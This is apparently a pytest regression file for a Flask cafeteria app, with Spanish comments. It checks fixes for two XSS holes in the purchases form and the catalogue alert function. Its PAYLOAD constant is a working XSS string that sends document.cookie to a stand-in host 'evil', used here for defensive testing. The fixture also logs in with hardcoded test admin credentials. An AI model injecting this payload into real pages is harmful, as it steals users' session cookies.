"""
Regresion HU-40: el selector de productos del formulario de compras
clonaba las <option> a partir de un template literal de JS con el
nombre del producto interpolado (vulnerable a backtick/${...}).
Ahora clona el <select> ya renderizado por Jinja (autoescape real).

Regresion HU-41: mostrarAlerta() en el catalogo insertaba el mensaje
de error (que puede incluir un nombre de producto) con innerHTML.
Ahora usa textContent.
"""
import os
import tempfile

_DB_DIR = tempfile.mkdtemp(prefix="cafeteria_test_xss2_")
_DB_PATH = os.path.join(_DB_DIR, "test_cafeteria.db")
os.environ['DATABASE_URL'] = f"sqlite:///{_DB_PATH}"
os.environ.pop('SSH_HOST', None)

import pytest

from app import create_app
from app.models import db, Producto

PAYLOAD = "Cafe`;fetch('//evil/'+document.cookie);//${alert(1)}"


@pytest.fixture()
def app():
    application = create_app('development')
    application.config['WTF_CSRF_ENABLED'] = False
    application.config['TESTING'] = True
    with application.app_context():
        db.session.add(Producto(nombre=PAYLOAD, precio=1000, costo=500, stock=5))
        db.session.commit()
    yield application
    with application.app_context():
        db.session.remove()
        db.drop_all()
        db.engine.dispose()


@pytest.fixture()
def client(app):
    return app.test_client()


def _login_admin(client):
    return client.post('/empleados/login', data={
        'email': 'admin@cafeteria.com',
        'clave': 'Admin123',
    }, follow_redirects=True)


def test_compras_ya_no_reconstruye_opciones_por_template_literal_js(app, client):
    _login_admin(client)
    resp = client.get('/admin/compras')
    html = resp.get_data(as_text=True)

    assert resp.status_code == 200
    # El patron vulnerable (nombre del producto dentro de un template
    # literal de JS) ya no debe existir en absoluto.
    assert 'opcionesProductos' not in html
    # El nuevo enfoque clona el <select> ya renderizado por Jinja.
    assert 'select-producto-plantilla' in html
    assert 'cloneNode' in html
    # El nombre del producto, aunque tenga backtick/${...}, debe seguir
    # apareciendo como texto de <option> normal (HTML-escapado por Jinja),
    # nunca dentro de un bloque <script>.
    assert PAYLOAD not in html.split('<script>')[-1] if '<script>' in html else True


def test_catalogo_usa_textcontent_no_innerhtml_para_el_mensaje_de_error(client):
    resp = client.get('/cliente/registro')
    # mostrarAlerta vive en catalogo.html, pero el bloque de scripts
    # extra se sirve solo en esa vista; probamos directo el archivo
    # fuente para no depender de tener sesion de cliente activa.
    with open('app/templates/cliente/catalogo.html', encoding='utf-8') as f:
        js_source = f.read()

    assert 'texto.textContent = msg' in js_source
    assert "div.innerHTML = `${msg}" not in js_source
